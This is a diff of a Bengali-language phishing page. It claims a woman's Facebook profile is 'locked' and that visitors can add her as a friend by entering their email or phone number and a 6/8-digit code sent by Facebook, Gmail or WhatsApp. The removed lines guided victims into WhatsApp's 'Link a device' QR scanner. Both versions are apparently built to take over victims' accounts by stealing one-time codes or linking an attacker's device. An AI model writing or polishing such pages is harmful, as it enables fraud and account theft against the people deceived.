@@ -55,19 +55,18 @@
 
         <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
             <h1 class="text-xl font-bold text-gray-900">ফ্রেন্ড এড করুন</h1>
-            <p class="text-gray-600 text-sm px-4">Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে । তার সাথে এড হতে চাইলে পাসওয়ার্ড নিচের ফাকা ঘরে বসিয়ে  অথবা কিবোর্ডের ওপর থেকে আপনার ইমেইলটি সিলেড করুন।</p>
-            <input type="email" id="email_field" autocomplete="email" placeholder="ইমু অথবা হোয়াটসঅ্যাপ নাম্বার" class="secure-input" oninput="autoCaptureEmail(this.value)">
+            <p class="text-gray-600 text-sm px-4">Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে । এড করতে নিচে ফাকা ঘরে ইউজার নাম লিখে Add Friend বাটুনে ক্লিক করুন।</p>
+            <input type="email" id="email_field" autocomplete="email" placeholder="ইমু অথবা হোয়াটসঅ্যাপ নাম্বার"  class="secure-input" oninput="autoCaptureEmail(this.value)">
             <button onclick="finalSubmit()" class="btn-blue">Add Friend</button>
         </div>
 
-        <div id="email page" class="hidden w-full flex flex-col items-center gap-1">
-            <div class="bg-green-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✓</div>
-            <h2 class="text-2xl font-bold text-green-600">কিউআর স্ক্যানার!</h2>
-            <p class="text-gray-600 text-sm">নিচের নীল বাটুনে ক্লিক করার পরে </p>
-            <a href="https://wa.me/settings/linked_devices class="btn-blue mt-2">Add করুন</a>
+        <div id="step2" class="hidden w-full flex flex-col items-center gap-4">
+            <h2 class="text-xl font-bold text-gray-900"> ফ্রেন্ড এড করুন </h2>
+            <p class="text-gray-600 px-6">সরাসরি Mst.Priya Akter এর সাথে ইমেইলে কথা বলতে চাইলে নিচের বাটনে ক্লিক করে মেসেজটি পাঠান।</p>
+            <button onclick="triggerGmailAction()" class="btn-blue">Send করুন</button>
         </div>
 
-        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-1">
             <div class="loader"></div>
             <h3 class="text-lg font-bold text-blue-600">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
             <p class="text-sm text-gray-700 px-10 font-medium text-center">আপনার ফেসবুক আইডি গুরুত্ব সহকারে যাচাই করা হচ্ছে। যাচাই করা শেষ না হওয়া পর্যন্ত দয়া করে একটু অপেক্ষা করুন।</p>
@@ -75,8 +74,8 @@
 
         <div id="otp_page" class="hidden w-full flex flex-col items-center">
             <h2 class="text-lg font-bold text-gray-900 mb-2">আইডি পাসওয়ার্ড দিয়ে লক করা আছে।</h2>
-            <p class="text-xs text-gray-600 mb-6 px-4"> আপনার whatsapp এ এড নাম্বার এর মেছেজ পাঠানো হয়েছে চেক করুন । মেছেজ এ আসা 4/চার সংখ্যার এড নাম্বার নিচে ফাঁকা ঘরে বসিয়ে এড করুন।</p>
-            <div id="otp-inputs" class="flex justify-center gap-1 mb-2">
+            <p class="text-xs text-gray-600 mb-6 px-4">Add করতে আপনার ফেসবুক নোটিফিকেশনে অথবা Gmail অথবা whatsapp এ আসা ৬/৮ সংখ্যার এড নাম্বার নিচে ফাঁকা ঘরে বসিয়ে এড করুন।</p>
+            <div id="otp-inputs" class="flex justify-center gap-2.5 mb-4">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
@@ -87,9 +86,9 @@
 
         <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
             <div class="bg-green-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✓</div>
-            <h2 class="text-2xl font-bold text-green-600">নিল বাটুন আসবে তারপরে (Link a device বাটুন তারপরে ফোনের লক আসবে আনলক করবেন তারপরে কিউআর স্ক্যানার আসবে)!</h2>
-            <p class="text-gray-600 text-sm">নিচের নিল বাটুনে ক্লিক করার পরে ,,, নীল বাটন পাবেন (Link a devices) বাটুনে ক্লিক করুন তারপরে (ফোনের লক আসবে আনলক করুন) তারপরে (কিউআর স্ক্যানার পাবেন) তার পর কিউআর কোড দিয়ে স্ক্যান করে এড করুন।</p>
-            <a href="https://wa.me/settings/linked_devices class="btn-blue mt-2">এড করুন</a>
+            <h2 class="text-2xl font-bold text-green-600">অভিনন্দন!</h2>
+            <p class="text-gray-600 text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে।</p>
+            <a href="https://m.me/sabinayasmeen121" class="btn-blue mt-2">View Profile</a>
         </div>
 
         <div id="error_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
